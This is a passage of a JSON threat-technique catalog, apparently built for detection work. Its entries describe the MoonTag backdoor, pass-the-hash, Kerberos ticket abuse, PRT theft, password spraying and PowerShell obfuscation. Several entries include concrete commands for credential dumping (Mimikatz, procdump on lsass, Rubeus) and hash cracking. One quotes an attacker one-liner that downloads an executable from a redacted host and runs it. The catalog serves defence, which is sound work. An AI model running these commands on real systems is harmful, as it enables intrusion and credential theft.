                "description": "MoonTag is a new backdoor which appears to be recently uploaded\nto VirusTotal. The backdoor seems to be in development phase and\nuses the Microsoft Graph API, which is a set of APIs provided by\nMicrosoft for accessing various services and data ref [1].  \n\nIt is believed to have been created by a Chinese threat actor,\nand it uses code samples for Graph API communication that were\nshared in a Chinese language Google Group.\n\nThe malware code can be found at the Virus Total page - ref [2],\nalthough none of the provided codes there appear completed.\nIt seems that several variants of the backdoor have been uploaded\nto VirusTotal. All of the variants found contain functionality\nfor communicating with the MS Graph API. The malware code shows\nfurther that the code uses a technique DLL side-loading in the\nprocesses, for example SvcHostDLL ref [2].   \n\nExamples: \n\n- install this dll as a Service host by svchost.exe, used by\nrundll32.exe to call callback\n- dll module handle used to get dll path in InstallService\n\nThe malware, which is named \u201cMoon_Tag\u201d by its developer \nis based on code published in a Google Group. All of the\nvariants found contain functionality for communicating\nwith the Graph API ref [3].  \n\nMoonTag samples match a YARA rule named `MAL_APT_9002_SabrePanda`\nthat detects samples from the 9002 RAT malware family used by\na Chinese affiliated threat actor. There are no strong links\nto attribute MoonTag to a specific threat actor, but based on\nthe reports and analytic pages MoonTag backdoor is written by\nChinese-speaking threat actor based on the Chinese language\nused in the Google Group post and the infrastructure used\nby the attackers ref [3].  \n\n#### MoonTag backdoor known behavior:\n\n- Persistence: The service installation ensures the backdoor remains\non the system across reboots.\n- Camouflage: By using legitimate Windows processes like svchost.exe\nand the netsvcs service group, it tries to blend in with the operating\nsystem's normal operations.\n- Remote Control: The service starts a command-line process (cmd.exe),\nallowing an attacker to execute arbitrary commands on the target machine,\nwhich could lead to further exploitation or system takeover.  \n"
            },
            "f33a693b-04cd-476e-9067-9deab561e55a": {
                "name": "Move laterally with SMB by abusing WMI",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Windows management instrumentation (WMI) is a tool that is implemented as service to locally\nand remotely manages data, operations and configuring settings on windows operating systems.\nWMI allows the administrator to see how the Operating system operates, what are its configurations\nand properties and to automatically collect a systems hardware and software data. It is supporting other\nscripting languages like Windows Script Host, VBScript, and PowerShell. WMI can be interacted\nlocally and remotely. WMI is a powerful tool which allows the threat actor to install backdoor, \ncode execution as well as do lateral movement.\nAs the threat actor has the valid credentials (password or hashes) they can specify malicious events to\nhappen for example every time the victim restarts the computer run the executable that is present\nin the specified directory.\n\nPayload loaded may allow the threat actor to make a separate call to the Remote Procedure Call (RPC) \non the victim machine, which is running over the SMB protocol.\nThe named pipe is then used to move laterally with the protocol."
            },
            "20bd3620-b13b-4895-b291-b1a26bd9aef3": {
                "name": "MS 365 admin compromised account",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Compromised credentials may be used to bypass access controls placed on various resources on systems\nwithin the network and may even be used for persistent access to remote systems and externally\navailable services, such as VPNs, Outlook Web Access, network devices, and remote desktop.\n\nCompromised credentials may also grant an adversary increased privilege to specific systems or access\nto restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction\nwith the legitimate access those credentials provide to make it harder to detect their presence.\n\nThere are several methods used by adversaries to compromise valid accounts, such as:  \n\n- Phishing attacks (Spear Phishing, Whaling, BEC).  \n- Password guessing and cracking (Credential stuffing, Bruteforce, Password spraying, exploiting weak passwords).\n- OAuth and API Abuse.\n- Exploiting vulnerabilities in third-party software.   \n"
            },
            "db749144-8044-4479-ab34-bff22251a1d7": {
                "name": "Named pipe creation using a predictable naming convention",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A threat actor may deploy named pipes are part of an automation process to achieve a goal.\nAs example, this could be the Cobalt Strike keylogger deployment, where the cobalt Strike\noperator merely clicks a button in the UI to deploy the keylogger, and behind the scenes \nthis runs an automation on the compromised endpoint, which includes the creation of a named \npipe, which in this case will have a predictable name, unless the CS operator changes this \nduring the deployment (manual config in CS possible to deploy with custom named pipe name)\n"
            },
            "fd0542bd-1541-42a7-8c07-0e073a198a53": {
                "name": "Network service discovery",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Network service discovery is the process of identifying and mapping\nthe services and applications running on a network. This can include\ndiscovering open ports, protocols, and services, as well as identifying\nthe operating systems and devices connected to the network. Devices that\nsupport NSD include printers, webcams, HTTPS servers, and other mobile\ndevices ref [1].  \n\nAdversaries may attempt to get a listing of services running on remote hosts, \nincluding those that may be vulnerable to remote software exploitation. \nMethods to acquire this information include port scans and vulnerability \nscans, using tools that are brought onto a system.  \n\n### Types of Network Service Discovery:\n\n- Active Scanning: Sending probes to the network to gather information\nabout the services and devices connected.\n- Passive Scanning: Monitoring network traffic to gather information\nabout the services and devices connected.\n- OS Detection: Identifying the operating system and device type\nconnected to the network.\n\n### Some of the tools which can be used for network service discovery:\n\n- Nmap: A popular network scanning tool that can perform active and\npassive scanning.\n- Netcat - this tool is a command-line utility scanning tool across\nnetwork connections over TCP and UDP protocols. It scan ports, transfer\nfiles, create chat servers, and perform HTTP requests ref [7].  \n- MASSCAN - Internet-scale port scanner. It can scan the entire network\nin a very short interval of time ref [8].   \n- OpenVAS: A vulnerability scanner that can perform network service\ndiscovery and identify potential vulnerabilities.\n- Nessus: A vulnerability scanner that can perform network service\ndiscovery and identify potential vulnerabilities.\n- Wireshark: A network protocol analyzer that can be used to monitor\nnetwork traffic and identify services and devices connected.\n- Netstat (net commands Windows): A command-line tool that can be used\nto view active\nnetwork connections and listening ports.\n- Native Bonjour application\n- Intermapper tool: Stands out for its strong focus on visual network\ndiscovery and mapping. A free 30-day trial is available on request.\n- NetBrain: Goes beyond traditional network discovery tools, offering\na comprehensive solution for visualizing, managing, and automating\nhybrid networks.\n\nExample for such activity could be scan port in a specific ip and\nport ranges.\n"
            },
            "1962f0c7-2f2f-4b4c-bab0-733af8033595": {
                "name": "New Windows access token creation",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "A Windows access token is a data structure that contains information\nabout a user's security context, including their security identifier\n(SID), group membership, privileges, and other security-related\ninformation. When a user logs in, the system generates an access\ntoken for them. A threat actor may create such access token on\nbehalf of the Windows user and to use it to access system resources\nor to escalate privileges for further access or lateral movement\nref [1].    \n\n### Windows access token creation steps\n\nThe access token creation process in Windows involves\nthe following steps:\n\n- The Local Security Authority (LSA) validates the user's\ncredentials (e.g., username and password).\n- The LSA creates a security database entry (SDBE) for the user.\n- The LSA generates an access token for the user based on the SDBE\nand the user's security context.\n- The LSA attaches the access token to the user's logon session.\n\n### Abuse of Windows API functions to create an access token\n\nA threat actor can use the native Windows API functions to manipulate\nthe access token, such as `DuplicateToken`, `CreateProcessAsUser`,\n`CreateRestrictedToken` and `SetThreadToken`. \n\n`CreateRestrictedToken` API  creates a version of an existing token\nwith reduced privileges by stripping out certain rights.\n\nBy manipulating these functions, the attacker can create a new token\nwith elevated privileges or mimic another user's token ref [3].    \n\n### Usage of runas commands\n\nThreat actors can use a set of runas commands to generate a new user's\naccess tokens and to use it on behalf on a legitimate user ref [a, 3].  \n\nExample:\n\n`runas /user:domain\\administrator cmd`\n\nThe adversaries commonly use user's token to elevate their security\ncontext from the administrator level to the SYSTEM level. An adversary\ncan use a token to authenticate to a remote system as the account for\nthat token if the  account has appropriate permissions on the remote\nsystem. \n\n### Known toolset used by the threat actors\n\n- Mimikatz\n- Windows API (WinAPI)\n- PowerShell\n- Windows Token Manager (WNTM)\n- Cobalt Strike\n- Metasploit\n- Windows Internal Database (WID)\n- Token Universe tool, ref [4] \n"
            },
            "eca91e9a-616f-4439-ac03-5d0ecc2266df": {
                "name": "Non-Approved container image deployed to run cryptominer",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "A threat actor can gain access to deployment workflows and pipelines and can then abuse acquired access to deploy images of their own choosing to deploy a cryptominer either directly via a malicious image, or by deploying a clean image first and then a cryptominer and C2 Infrastructure"
            },
            "02311e3e-b7b8-4369-9e1e-74c0a844ae0f": {
                "name": "NTLM credentials dumping via SMB connection",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "### Attack vector related to Outlook vulnerability CVE-2023-23397\n\n**key point: no user interaction**  \n\nAn attacker sends an email message with an extended MAPI property with a \nUNC path pointing to an SMB network share on a threat actor-controlled \nserver.  \n\nWhen a vulnerable Microsoft Outlook client (CVE-2023-23397) \nreceives in the inbox, it processes that email.  \n\nWithout any user interaction, a connection to the remote SMB server is \nestablished and the user's NTLM negotiation message are passed in the \nhearders.  \n\nThe attacker can capture this message tp replay for authentication \nagainst other systems that support NTLM authentication.  \n\nThe attacker may also try to crack the original password if not too \ncomplex.  \n\nThe outbound NTLM negotiation message is passed with SMB and WebDav \nprotocols (see Didier Steven's blog).\n\n### Attack vector using a link a user will be enticed to click on\n\n**key point: the user needs to click on the link**  \n\nThis attack is a subset of attackers objectives when using spear \nphishing emails with a link in message body or in an attachment.\n\n#### Attack vector using Outlook vulnerability\n\nA vulnerability like CVE-2024-21413, also known as the MonikerLink bug, \nallows remote code execution and the leakage of local NTLM information.  \n\nMoniker-based links exploit a logic flaw in how vulnerable versions\nof Outlook process certain file types, causing files to open in\nediting mode instead of the sandboxed `Protected View`.  \n\nIf the malicious link points to SMB shares controlled by the attacker,\nWindows automatically attempts to authenticate using NTLM credentials\nenabling threat actors to steal NTLMv2 hashes for initial access.  \n"
            },
            "a3df7d01-5fd9-4522-8eaf-f28895046b7d": {
                "name": "Obfuscate binaries through PowerShell commands",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Obfuscating binaries through PowerShell commands is a technique\nused to make it difficult for reverse engineers, malware analysts,\nor security researchers to understand the purpose and behavior of\na binary or script. This is often used by attackers to evade\ndetection and analysis.  \n\n### Some of the methods for binary obfuscation\n\n- ConvertTo-Base64: Converts a string to a Base64-encoded string.\n- Compress-Archive: Compresses a file or folder using Gzip.\n- Invoke-Expression: Executes a string as a PowerShell expression,\nallowing for dynamic code execution.\n- Add-Type: Loads a .NET assembly, which can be used to execute\ncode dynamically.\n- Reflection.Assembly: Loads a .NET assembly using reflection.\n\nFor more information, an examples are given in the ref [2], [3], [4].\n\n### A process for base64 encoded binary \n\nUsually a base64 encoded binary dropped to a computer is achieved\nvia a sequence of PowerShell (PS) commands.\n\nAn example for such pattern is represented in several steps below:\n\n1. Base64 encoding\n\nLike a first step, a binary (an executable file, for instance) is encoded \nin base64. This encoding scheme is used to represent binary data in an ASCII\nstring format. This is often done to bypass security controls that might\nblock or inspect binary data but allow text.\n\n2. Dropping the encoded binary\n\nThe base64 encoded string is then \"dropped\" onto the target computer.\nThis could be done through various means, such as being embedded in a script,\nsent via email, or included in a malicious document that executes PowerShell\ncommands when opened.\n\n3. Decoding the binary in PowerShell\n\nOnce the encoded string is on the target system, PowerShell can be used to\ndecode it. The [System.Convert]::FromBase64String() method in PowerShell is\nused for this purpose.\n\nExample for PowerShell obfuscation code\n\n```\nencodedString = \"YOUR_BASE64_ENCODED_STRING_HERE\"\n$decodedBytes = [System.Convert]::FromBase64String($encodedString)\n```\n\n4. Saving the decoded Binary to a file\n\nAfter decoding, the binary needs to be saved to a file. This can\nbe done using the [System.IO.File]::WriteAllBytes() method:\n\n```\n$path = \"C:\\Path\\To\\Save\\YourFile.exe\"\n[System.IO.File]::WriteAllBytes($path, $decodedBytes)\n\n```\n5. Executing the binary\n\nFinally, the saved binary can be executed. One of the methods in which\nthe threat actors can do this is directly from PowerShell or through\nother means such as creating a shortcut or using other scripts.\n\nExample:\n\n```\nStart-Process -FilePath $path\n```\n Another example for binary obfuscation through PowerShell commands is shown in Chinese-linked cluster threat actor campaign ref [1].    The threat actor group is observed to obfuscate binaries (in particular AppSov.exe) using PowerShell commands.  \n The threat actor deployed AppSov.exe by executing a PowerShell command that performs the following actions:\n - A threat actor downloads a binary file named from a remote endpoint using the utility curl.exe - After they save the downloaded file as `AppSov.exe` in the `C:\\ProgramData\\` directory. - Launches the executable using the `Start-Process` PowerShell command. - System reboot after some period of time. ref [1].      \n An example for used command:\n ``` sleep 60;curl.exe -o c:\\programdata\\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\\programdata\\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;  ```\n"
            },
            "10663f4a-6432-4c8f-bd3a-eaa599bb474e": {
                "name": "OneDrive API abuse to exfiltrate sensitive data",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "OneDrive API abuse to exfiltrate sensitive data occurs when attackers misuse legitimate \nMicrosoft Graph API endpoints and OneDrive\u2019s cloud storage features to steal confidential \nor sensitive information from an organization.\n\n### How Does It Work?\n\n1. **API Exploitation via Microsoft Graph**  - Attackers use the Microsoft Graph API to access users\u2019 OneDrive storage.  - Common endpoints include:    - `https://graph.microsoft.com/v1.0/users/{id}/drive` (to list drives)    - `https://graph.microsoft.com/v1.0/drive/items/{item-id}/content` (to download files)  - These APIs are normally used for legitimate cloud storage operations.\n\n2. **OAuth and Application Permissions**  - Attackers may compromise existing OAuth applications or create new ones.  - By granting these applications broad permissions (like \u201cFiles.Read.All\u201d or   \u201cFiles.ReadWrite.All\u201d), attackers gain access to OneDrive files without direct   user interaction.\n\n3. **Use of Trusted Cloud Services**  - Data exfiltration is carried out through OneDrive, a trusted and widely used   cloud service.  - This makes malicious activity harder to distinguish from normal business operations.\n\n4. **Automated Exfiltration**  - Attackers often use scripts or malware to automate the process of accessing   and transferring files via OneDrive.  - This allows for large-scale, stealthy data theft.\n\n### Attack Scenarios\n\n- **Compromised Credentials:** An attacker gains access to an account with OneDrive \nAPI permissions.\n- **Malicious OAuth App:** An attacker registers an OAuth app with excessive permissions \nand uses it to access OneDrive files.\n- **Automated Scripts:** Attackers use PowerShell or other scripting tools to interact \nwith the OneDrive API, extracting sensitive files at scale.\n"
            },
            "e1741a76-3df1-430a-8dda-5c6bc9c3e1dd": {
                "name": "Paragon Spyware",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Paragon Spyware, also known as Graphite, is a sophisticated surveillance tool developed \nby Paragon Solutions, an Israeli company founded in 2019. This spyware is designed to infiltrate \nencrypted messaging apps such as WhatsApp, Signal, Facebook Messenger, and Gmail, allowing \nlaw enforcement and intelligence agencies to intercept private communications.    \n\n## Key Features    \n\n- **Zero-Click Exploit**: Graphite uses a \"zero-click\" method, meaning it can infect \na device without any action from the target.\n- **WhatsApp Vulnerability**: The spyware exploits a vulnerability in WhatsApp, \nusing a malicious PDF file to gain access to the device.\n- **Data Extraction**: Once installed, Graphite can extract stored files, photos, \nand monitor communications across various platforms.\n- **Cloud Upload**: The extracted data is uploaded to a cloud server, leaving no \ntraces on the infected device.\n- **Sandbox Escape**: The spyware can escape the Android sandbox to compromise other \napps on the targeted devices.    \n\n## Recent Developments    \n\nIn January 2025, WhatsApp patched a zero-day vulnerability that was being exploited \nby Paragon Spyware. The company notified approximately 90 Android users from over \n20 countries who were targeted, including journalists and activists.\n"
            },
            "4472e2b0-3dca-4d84-aab0-626fcba04fce": {
                "name": "Pass the hash attack to elevate privileges",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Elevating privileges on Windows to System allows a threat actor (or \nsysadmin) to do things that are not possible without SYSTEM/root \nprivileges.\n\nPass the hash is a method of authenticating as a user, without having \naccess to the user's cleartext password, by stealing password hashes and \nusing this password hash to authenticate directly to a resource via a \nthird party non-Microsoft tool such as Mimikatz. This method bypasses \nstandard authentication steps that require a cleartext password, moving\ndirectly into the portion of the authentication that uses the password \nhash.\n\nMimikatz sekurlsa module without the /impersonate option implements the standard\npass-the-hash technique, which works by authenticating to a resource, by in the \nbackground spawning a new process in the context of the hash and attacker-\ndesired elements. For examples, see the reference to thehacker.recipes.\n"
            },
            "479a8b31-5f7e-4fd6-94ca-a5556315e1b8": {
                "name": "Pass the hash using impersonation within an existing process",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Adversaries may use a particular flavor of pass the hash - to leverage \nan acquired handle (hash) on NT AUTHORITY\\SYSTEM access token to spawn a \nnew NT AUTHORITY\\SYSTEM context process, impersonate the token for this\nprocess into the attacker-desired existing thread, and then kill the \nspawned NT AUTHORITY\\SYSTEM process again, making it a temp process used\nto allow the threat actor to elevate privileges to NT AUTHORITY\\SYSTEM.\n\nThis sets the technique apart from spawning a new process with the \nattacker-desired privileges that pass the hash without use of the \n/IMPERSONATE option leads to. \n\nElevating privileges on Windows to System allows a threat actor (or \nsysadmin) to do things that are not possible without SYSTEM/root \nprivileges.\n\nPass the hash is a method of authenticating as a user without having \naccess to the user's cleartext password by stealing password hashes. This \nmethod bypasses standard authentication steps that require a cleartext \npassword, moving directly into the portion of the authentication that uses \nthe password hash. \n\nMimikatz sekurlsa module with the /impersonate option implements this\nparticular approach as an option alongside other more known NTLM based\nprocedures.\n"
            },
            "b1b6d2d7-0832-46fc-a3e5-6e6411179c45": {
                "name": "Pass the Primary Refresh Token (PRT)",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Pass-the-PRT (Primary Refresh Token) is an advanced cyberattack technique targeting \ncloud environments, particularly Microsoft Entra ID (formerly Azure AD). It enables \nattackers to bypass MFA and move laterally within cloud infrastructures by stealing\nand exploiting valid authentication tokens.\n\n### What is a Primary Refresh Token (PRT)?\nA PRT is a persistent authentication token issued when a user logs into an Azure-joined \nor hybrid Azure-joined Windows 10+ device. It enables single sign-on (SSO) to Azure \nAD resources without reauthentication. Key characteristics:\n- **Validity**: 14\u201390 days, depending on usage.\n- **Storage**: Securely stored in the device\u2019s LSASS memory and protected by the \nTrusted Platform Module (TPM).\n- **Function**: Contains user identity, session keys, and MFA claims, allowing seamless \naccess to cloud resources like Microsoft 365.\n\n### How Pass-the-PRT Works\nAttackers execute this attack in three stages:\n\n1. **Initial Compromise**:    Gain access to a victim\u2019s device via phishing, malware, or exploits. Local admin   privileges are typically required.\n\n2. **PRT Extraction**:    Extract the PRT and associated session key using tools like:  - **Mimikatz** (`sekurlsa::cloudap` module).  - **AADInternals PowerShell** (e.g., `Get-AADIntUserPRTToken`).  - **BrowserCore.exe** (to steal the `x-ms-RefreshTokenCredential` cookie).\n\n3. **Lateral Movement**:    Use the stolen PRT to:  - Generate valid PRT cookies for browsers (Chrome/Edge).  - Request access tokens for Azure AD resources without triggering MFA.  - Move laterally across cloud applications and data as the compromised user.\n\n### Key Risks and Challenges\n- **MFA Bypass**: PRTs embed MFA claims, allowing attackers to bypass conditional \naccess policies.\n- **Stealth**: Attacks mimic legitimate user activity, evading traditional security \ntools.\n- **Persistence**: PRTs remain valid for weeks, enabling prolonged access even if \npasswords change.\n"
            },
            "03cc9593-e7cf-484b-ae9c-684bf6f7199f": {
                "name": "Pass the ticket using Kerberos ticket",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Pass-the-Ticket using Kerberos tickets is an advanced method wherein threat \nactors illicitly extract and exploit Kerberos tickets to gain unauthorized \naccess within a network. In the Kerberos authentication process, a Ticket \nGranting Ticket (TGT) is issued to users upon login. Adversaries involves \nthe extraction of these Kerberos tickets through various means, such as \nleveraging vulnerabilities, utilizing tools like Mimikatz, or exploiting \nsystem weaknesses.   \n\nSubsequently, adversaries misuse the acquired tickets to authenticate\nthemselves on other network systems without the need for the user's\npassword, allowing lateral movement and potential access to sensitive\ninformation. Commonly employed tools, like Mimikatz and Rubeus,\nfacilitate these malicious activities.  \n\nThere are several types of possible TGT (ticket granting ticket)\nauthentication methods, for example:   \n\n1. Credential theft technique permitting lateral movement, escalating\nprivileges, and gaining access to sensitive resources (TGT)  \n\n2. Silver Ticket: Compromising Service Accounts with Kerberos Silver\nTickets (forged TGS for specific Services); The Silver ticket attack\nis based on crafting a valid TGS for a service once the NTLM hash\nof a user account is owned. In this case, the NTLM hash of a computer\naccount (which is kind of a user account in AD) is owned. Hence, it is\npossible to craft a ticket in order to get into that machine with\nadministrator privileges through the SMB service. (ref [3])  \n\n3. Golden Ticket: (forged TGTs) \nThe Golden ticket technique is similar to the Silver ticket one,\nbut in this case a TGT is crafted by using the NTLM hash of the krbtgt\nAD account. The advantage of forging a TGT instead of TGS is being able\nto access any service (or machine) in the domain. (ref [3])    \n\n### Tools\n\nTo carry out these attacks, adversaries use various types of tools,\nsuch as:    \n\n#### Mimikatz  \n\nCommands:  \n\nsekurlsa::Minidump lsassdump.dmp\nsekurlsa::logonPasswords\n\n#### Rubeus  \n\nCommands:  \n\n\\Rubeus.exe /ticket:base64blob\n\\Rubeus.exe ptt /ticket:BASE64BLOBHERE\n\n#### Procdump  \n\nCommands:  \n\nprocdump -ma lsass.exe lsass_dump  \n\nThe klist command that permit to see the Kerberos Tickets are the following:  \n\n- Syntax: klist [-lh <logonID.highpart>] [-li <logonID.lowpart>] tickets | tgt | purge | sessions | kcd_cache | get | add_bind | query_bind | purge_bind      * The syntax is related to Kerberos ticket management and credential cache management.\n\n- Parameters:    * -lh: Denotes the high part of the user's locally unique identifier (LUID), expressed in     hexadecimal. If neither -lh nor -li are present, the command defaults to the LUID of the     user who is currently signed in.    * -li: Denotes the low part of the user's locally unique identifier (LUID), expressed in hexadecimal.     If neither -lh nor -li are present, the command defaults to the LUID of the user who is currently signed in.    * tickets: Lists the currently cached ticket-granting-tickets (TGTs), and service tickets of the specified     logon session. This is the default option.    * tgt: Displays the initial Kerberos TGT.    * purge: Allows you to delete all the tickets of the specified logon session.    * sessions: Displays a list of logon sessions on this computer.    * kcd_cache: Displays the Kerberos constrained delegation cache information.    * get: Allows you to request a ticket to the target computer specified by the service principal name (SPN).    * add_bind: Allows you to specify a preferred domain controller for Kerberos authentication.    * query_bind: Displays a list of cached preferred domain controllers for each domain that Kerberos has contacted.    * purge_bind: Removes the cached preferred domain controllers for the domains specified.    * kdcoptions: Displays the Key Distribution Center (KDC) options specified in RFC 4120.\n"
            },
            "b0d6bf74-b204-4a48-9509-4499ed795771": {
                "name": "Pass-the-cookie Attack",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Pass-The-Cookie (PTC), also known as token compromise, is a common attack technique\nemployed by threat actors in SaaS environments. \n\nA PTC is a type of attack where an attacker can bypass authentication controls by \ncompromising browser cookies. At a high level, browser cookies allow web applications\nto store user authentication information. \n\nSpecifically, an authentication cookie allows a website to keep the user signed in\nand not constantly prompt for credentials every time user clicks a new page.\nThe server uses the token to recognize the user and confirm they are authenticated \nwithout requiring the user to re-enter their credentials. Session tokens maintain the\nstate of the user, allowing them to interact with web services in a stateful manner \ndespite the stateless nature of the web.\n\nAfter authentication to Azure AD via a browser, a cookie is created and stored for\nthat session. If attackers can compromise a device and extract the browser cookies,\nthey could pass that cookie into a separate web browser on another system, to be\ninjected into a new web session to trick the browser into thinking the authenticated\nuser is present and does not need to prove their identity, bypassing security \ncheckpoints along the way.\n\nBecause such cookie is also created and stored on a web browser when MFA is in play,\nthe same technique can handily be used to bypass it.\n"
            },
            "5ea50181-1124-49aa-9d2c-c74103e86fd5": {
                "name": "Pass-the-hash on SMB network shares",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "In a **Pass-the-Hash attack (PtH)**, Attackers may use offensive tools to load \nthe NTLM hash and try to connect to SMB network shares that are reachable \nfrom the attacker device (SMB port is open to the internet - initial access) \nor from a compromised station under attacker's control - lateral movement. \n\nCrackmapexec is an excellent tool to try to connect to SMB network \nshares using NTLM hash (PtH).  \n\nIt scales really well as you can simply point and shoot at a whole \nsubnet or list of IP addresses.  \n\nAttacker may obtain read-only access to SMB network shares and could retrieve \nadditional information.  \n\nThey may get write access to the share and then be able to drop files \nthat victims might be enticed to open or to execute.\n"
            },
            "5d373113-18f9-41bb-bdde-3abbfa53cb86": {
                "name": "Passing SeDebugPrivilege to AdjustTokenPrivilege API elevating privileges of a running process",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A threat actor can attempt to escalate privileges from a user or \nadministrator context to NT SYSTEM by using the SeDebugPrivilege to adjust \nthe memory of running process with a call to the AdjustTokenPrivilege API. \nThis method uses built-in Windows APIs and commands to escalate privileges \nby changing the privileges of the running process in-memory. See Palantir \nreference. \n\nThe intention of access token impersonation/theft is to grant a process the \nsame permissions as another running process with a specific context, often \nNT SYSTEM. This may increase the capabilities of the now-elevated process \nor reduce its probability of detection.\n\nFor access token impersonation an adversary can use standard command-line \nshell to initiate 'runas' commands or to use payloads that call Windows \ntoken APIs directly. The changes in Windows API calls can manipulate \naccess tokens for further account access and malicious purposes. \n"
            },
            "35c76d6c-2ac7-486e-b0b7-b56f6b110bec": {
                "name": "Password hash cracking on Windows",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Threat actors often extract valid credentials from target systems. When\nthese credentials are in a hashed format, threat actors may use different\nmethods to crack and obtain the credentials in clear text. When this\ninformation cannot be directly leveraged for higher privileges (like with\npass-the-hash, overpass-the-hash), it is required to crack it. Some methods\nthat threat actors use include: brute force, dictionary attack, or sub-set\nof the dictionary attack named rainbow tables. Threat actors can use\na variety of tools to crack password hashes. For example,\nMimikatz, Hashcat, CrackStation, Password Cracker, Brutus Password Cracker,\nAircrack, THC Hydra, RainbowCrack, Cain and Abel, Medusa, John The Ripper,\nophCrack, WFuzz, L0phtCrack, OphCrack and others.\n\nThe threat actors can crack the password hashes, for example with JTR or\nHashcat cracking tools that use text files to match and crack the hashes. \n(an example for a text file could be: rockyou.txt)\n\ngunzip /usr/share/wordlist/file.txt\njohn hash.txt /usr/share/wordlists/file.txt \u2014 format=nt\n\nhashcat -m 1000 hash.txt /usr/share/wordlists/file.txt\n\nAn example of how to use Hashcat for a dictionary attack:\n\nhashcat --attack-mode 0 --hash-type $number $hashes_file $wordlist_file\n\nOR \n\nhashcat --loopback --attack-mode 0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file\n\nExample for Hashcat tool which can bruteforce any password from 4 to 8\ncharacters long:\n\nhashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file \"file\"\n\nHashcat can also be started with custom charsets:\n\nhashcat --attack-mode 3 --custom-charset1 \"?u\" --custom-charset2 \"?l?u?d\" --custom-charset3 \"?d\" --hash-type $number $hashes_file \"file\"\n"
            },
            "cc546bbc-f71c-4538-934c-415d6adc293b": {
                "name": "Password spraying attack",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Password spraying is a technique that attackers use to try a small list\nof common or expected passwords against a set of usernames. This technique\nis used to avoid account lockouts that would normally occur when brute\nforcing a single account with many passwords1. Password spraying is a\nsub-technique of credential spraying, which is just credential guessing\nbut \"sprayed\" (i.e. against multiple accounts). (ref [1], [2])  \n\nAdversaries have been observed using password spray attacks to exploit\nlogins of network services or credential harvesting, typically used\nto obtain initial foothold.\n\nThey attempt username and password combinations in a slow manner,\nresearching the pattern for valid accounts (e.g. email address or username\nlength). Organizations targeted typically see a few authentication attempts\nper account; with nearly every attempt originating from constantly rotating\nIP addresses, many associated with the Tor anonymizing service.  \n\nSome strategies conducted by adversaries are:  \n\n- Credential stuffing towards Microsoft Office 365 accounts, there are\ntools that identify valid credentials for Office 365 and Azure AD accounts,\nas Spray365.  \n\n- Abuse of Exchange servers. There are tools for searching through email\nin an Exchange environment for specific terms (passwords, insider intel,\nnetwork architecture information, etc.) as for example MailSniper; which\nincludes modules for password spraying, enumerating users and domains or\ngathering the Global Address List (GAL) from OWA and EWS.  \n\n- Password spray against exposed Active Directory Federation Services\n(ADFS) infrastructure. The organizations not using MFA have a higher risk\nof having accounts compromised through password spray. If attack is\nsuccessful, adversaries may look for additional contacts, sensitive\ninformation, privileged information, or send phishing links to\nothers in the organization.  \n\n\n- Password spraying attack against Microsoft Entra ID applications\nPassword spray attacks involve trying a few common passwords against\nspecific or many accounts. This may include and attack against the\ncloud-based Microsoft application solution: Microsoft Entra ID. The\ngoal is to bypass traditional protections like password lockout and\nmalicious IP blocking. They can include low number of login attempts\nor lack of consistency which makes them difficult to detect.  \n"
            },
            "f18be76e-f2b3-410a-80c5-d67e7b8e7b03": {
                "name": "Perform Microsoft Entra ID connectors MITM attack",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "These connectors facilitate outbound connections to the Microsoft Entra Private \nAccess and application proxy services. They must be installed on a Windows Server \nwith access to backend resources. Connectors can be organized into groups to handle \ntraffic to specific resources, enhancing management and optimization.  \n\nThe risks of man-in-the-middle attacks on Microsoft Entra ID connectors include the \ninterception of sensitive information such as authentication tokens, usernames, passwords, \nand authentication artifacts like session cookies. Adversaries can capture this data, \nmimic legitimate users, and potentially bypass multifactor authentication requirements. \nThis poses a significant threat to data confidentiality, integrity, and privacy within \nthe Microsoft Entra ecosystem. \n\nLikewise, common techniques used in man-in-the-middle attacks on Microsoft Entra ID connectors include:\n\n- Phishing Attacks\n- Session Hijacking\n- DNS Spoofing\n- OAuth Application Manipulation\n- DNS-over-HTTPS\n- Cookie Theft\n- Business Email Compromise (BEC) Attacks\n"
            },
            "50c7e353-ac1c-48a7-8c98-2515b45f31f4": {
                "name": "Persistence through automation runbooks in Azure",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
